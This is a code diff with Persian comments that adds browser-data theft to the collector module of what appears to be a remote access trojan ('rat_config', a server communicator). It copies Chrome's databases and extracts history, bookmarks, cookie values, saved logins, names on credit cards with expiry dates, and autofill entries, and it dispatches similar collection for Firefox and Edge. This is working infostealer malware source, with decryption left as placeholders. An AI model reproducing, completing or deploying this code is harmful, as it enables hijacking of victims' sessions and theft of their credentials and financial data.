@@ -13,6 +13,7 @@ from datetime import datetime, timedelta
 from rat_config import Config
 from encryption.manager import EncryptionManager
 from network.communicator import ServerCommunicator, CommunicationError
+import shutil
 
 class SystemCollector:
     def __init__(self):
@@ -303,6 +304,335 @@ class SystemCollector:
         except Exception as e:
             self.logger.error(f"Failed to process {browser} database: {str(e)}")
             return {"history": [], "cookies": [], "error": str(e)}
+
+    def _get_chrome_history(self, profile_path):
+        """گرفتن تاریخچه Chrome"""
+        try:
+            history_db = os.path.join(profile_path, "History")
+            if not os.path.exists(history_db):
+                return []
+                
+            temp_db = f"temp_chrome_history_{int(time.time())}.sqlite"
+            shutil.copy2(history_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT url, title, last_visit_time 
+                FROM urls 
+                ORDER BY last_visit_time DESC 
+                LIMIT 500
+            """)
+            
+            history = []
+            for row in cursor.fetchall():
+                visit_time = datetime(1601, 1, 1) + timedelta(microseconds=row[2])
+                history.append({
+                    "url": row[0],
+                    "title": row[1] or "No title",
+                    "visit_time": visit_time.isoformat()
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            return history
+            
+        except Exception as e:
+            self.logger.error(f"Chrome history error: {str(e)}")
+            return []
+    
+    def _get_chrome_bookmarks(self, profile_path):
+        """گرفتن بوکمارک‌های Chrome"""
+        try:
+            bookmarks_file = os.path.join(profile_path, "Bookmarks")
+            if not os.path.exists(bookmarks_file):
+                return []
+                
+            with open(bookmarks_file, 'r', encoding='utf-8') as f:
+                bookmarks_data = json.load(f)
+            
+            bookmarks = []
+            
+            def extract_bookmarks(node):
+                if 'children' in node:
+                    for child in node['children']:
+                        extract_bookmarks(child)
+                elif node.get('type') == 'url':
+                    bookmarks.append({
+                        "name": node.get('name', ''),
+                        "url": node.get('url', ''),
+                        "date_added": node.get('date_added', '')
+                    })
+            
+            if 'roots' in bookmarks_data:
+                for root in bookmarks_data['roots'].values():
+                    extract_bookmarks(root)
+            
+            return bookmarks
+            
+        except Exception as e:
+            self.logger.error(f"Chrome bookmarks error: {str(e)}")
+            return []
+    
+    def _get_chrome_cookies(self, profile_path):
+        """گرفتن کوکی‌های Chrome"""
+        try:
+            cookies_db = os.path.join(profile_path, "Cookies")
+            if not os.path.exists(cookies_db):
+                return []
+                
+            temp_db = f"temp_chrome_cookies_{int(time.time())}.sqlite"
+            shutil.copy2(cookies_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
+                FROM cookies 
+                ORDER BY creation_utc DESC 
+                LIMIT 1000
+            """)
+            
+            cookies = []
+            for row in cursor.fetchall():
+                cookies.append({
+                    "domain": row[0],
+                    "name": row[1],
+                    "value": row[2],
+                    "path": row[3],
+                    "expires": row[4],
+                    "secure": bool(row[5]),
+                    "httponly": bool(row[6])
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            return cookies
+            
+        except Exception as e:
+            self.logger.error(f"Chrome cookies error: {str(e)}")
+            return []
+    
+    def _get_chrome_passwords(self, profile_path):
+        """گرفتن پسوردهای Chrome (در صورت فعال بودن)"""
+        if not Config.COLLECT_PASSWORDS:
+            return []
+            
+        try:
+            login_data_db = os.path.join(profile_path, "Login Data")
+            if not os.path.exists(login_data_db):
+                return []
+                
+            temp_db = f"temp_chrome_logins_{int(time.time())}.sqlite"
+            shutil.copy2(login_data_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT origin_url, username_value, password_value, date_created
+                FROM logins 
+                ORDER BY date_created DESC
+            """)
+            
+            passwords = []
+            for row in cursor.fetchall():
+                # دکریپت کردن پسورد (نیاز به ماژول اضافی دارد)
+                password_value = "Encrypted - needs decryption"
+                
+                passwords.append({
+                    "url": row[0],
+                    "username": row[1],
+                    "password": password_value,
+                    "date_created": row[3]
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            return passwords
+            
+        except Exception as e:
+            self.logger.error(f"Chrome passwords error: {str(e)}")
+            return []
+    
+    def _get_chrome_credit_cards(self, profile_path):
+        """گرفتن اطلاعات کارت‌های اعتباری Chrome"""
+        try:
+            web_data_db = os.path.join(profile_path, "Web Data")
+            if not os.path.exists(web_data_db):
+                return []
+                
+            temp_db = f"temp_chrome_webdata_{int(time.time())}.sqlite"
+            shutil.copy2(web_data_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted
+                FROM credit_cards 
+                ORDER BY date_modified DESC
+            """)
+            
+            credit_cards = []
+            for row in cursor.fetchall():
+                credit_cards.append({
+                    "name": row[0],
+                    "exp_month": row[1],
+                    "exp_year": row[2],
+                    "number": "Encrypted"
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            return credit_cards
+            
+        except Exception as e:
+            self.logger.error(f"Chrome credit cards error: {str(e)}")
+            return []
+    
+    def _get_chrome_autofill(self, profile_path):
+        """گرفتن اطلاعات Autofill Chrome"""
+        try:
+            web_data_db = os.path.join(profile_path, "Web Data")
+            if not os.path.exists(web_data_db):
+                return []
+                
+            temp_db = f"temp_chrome_webdata_{int(time.time())}.sqlite"
+            shutil.copy2(web_data_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT name, value, value_lower, date_created, date_last_used
+                FROM autofill 
+                ORDER BY date_last_used DESC 
+                LIMIT 500
+            """)
+            
+            autofill_data = []
+            for row in cursor.fetchall():
+                autofill_data.append({
+                    "name": row[0],
+                    "value": row[1],
+                    "date_created": row[3],
+                    "date_last_used": row[4]
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            return autofill_data
+            
+        except Exception as e:
+            self.logger.error(f"Chrome autofill error: {str(e)}")
+            return []
+
+    def collect_comprehensive_browser_data(self):
+        """جمع‌آوری اطلاعات کامل مرورگر"""
+        if not Config.ENABLE_BROWSER_DATA_COLLECTION:
+            self.logger.info("Browser data collection disabled")
+            return {}
+
+        self.logger.info("Collecting comprehensive browser data...")
+        try:
+            browser_data = {
+                "chrome": self._get_chrome_data(),
+                "firefox": self._get_firefox_data(),
+                "edge": self._get_edge_data(),
+                "timestamp": datetime.now().isoformat()
+            }
+
+            self.results["browser_data"] = browser_data
+            self.logger.info("Comprehensive browser data collected successfully")
+            return browser_data
+
+        except Exception as e:
+            self.results["browser_data"]["error"] = str(e)
+            self.logger.error(f"Failed to collect comprehensive browser data: {str(e)}")
+            return {"error": str(e)}
+
+    def _get_chrome_data(self):
+        """جمع‌آوری اطلاعات کامل Chrome"""
+        try:
+            chrome_data = {}
+            chrome_base_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
+
+            if not os.path.exists(chrome_base_path):
+                return {"error": "Chrome not installed or path not found"}
+
+            # پیدا کردن پروفایل پیش‌فرض
+            default_profile = os.path.join(chrome_base_path, "Default")
+
+            chrome_data = {
+                "history": self._get_chrome_history(default_profile),
+                "bookmarks": self._get_chrome_bookmarks(default_profile),
+                "cookies": self._get_chrome_cookies(default_profile),
+                "passwords": self._get_chrome_passwords(default_profile) if Config.COLLECT_PASSWORDS else [],
+                "credit_cards": self._get_chrome_credit_cards(default_profile),
+                "autofill": self._get_chrome_autofill(default_profile)
+            }
+
+            return chrome_data
+
+        except Exception as e:
+            return {"error": f"Chrome data collection failed: {str(e)}"}
+
+    def _get_firefox_data(self):
+        """جمع‌آوری اطلاعات کامل Firefox"""
+        try:
+            firefox_data = {}
+            firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+
+            if not os.path.exists(firefox_path):
+                return {"error": "Firefox not installed or path not found"}
+
+            # پیدا کردن پروفایل پیش‌فرض
+            profiles = [p for p in os.listdir(firefox_path) if p.endswith('.default-release')]
+            if not profiles:
+                return {"error": "No Firefox profile found"}
+
+            profile_path = os.path.join(firefox_path, profiles[0])
+
+            firefox_data = {
+                "history": self._get_firefox_history(profile_path),
+                "bookmarks": self._get_firefox_bookmarks(profile_path),
+                "cookies": self._get_firefox_cookies(profile_path),
+                "passwords": self._get_firefox_passwords(profile_path) if Config.COLLECT_PASSWORDS else [],
+                "credit_cards": self._get_firefox_credit_cards(profile_path)
+            }
+
+            return firefox_data
+
+        except Exception as e:
+            return {"error": f"Firefox data collection failed: {str(e)}"}
+
+    def _get_edge_data(self):
+        """جمع‌آوری اطلاعات کامل Edge"""
+        try:
+            edge_data = {}
+            edge_base_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")
+
+            if not os.path.exists(edge_base_path):
+                return {"error": "Edge not installed or path not found"}
+
+            default_profile = os.path.join(edge_base_path, "Default")
+
+            edge_data = {
+                "history": self._get_edge_history(default_profile),
+                "bookmarks": self._get_edge_bookmarks(default_profile),
+                "cookies": self._get_edge_cookies(default_profile),
+                "passwords": self._get_edge_passwords(default_profile) if Config.COLLECT_PASSWORDS else [],
+                "credit_cards": self._get_edge_credit_cards(default_profile),
+                "autofill": self._get_edge_autofill(default_profile)
+            }
+
+            return edge_data
+
+        except Exception as e:
+            return {"error": f"Edge data collection failed: {str(e)}"}
 
     def collect_installed_programs(self):
         """جمع‌آوری برنامه‌های نصب شده"""
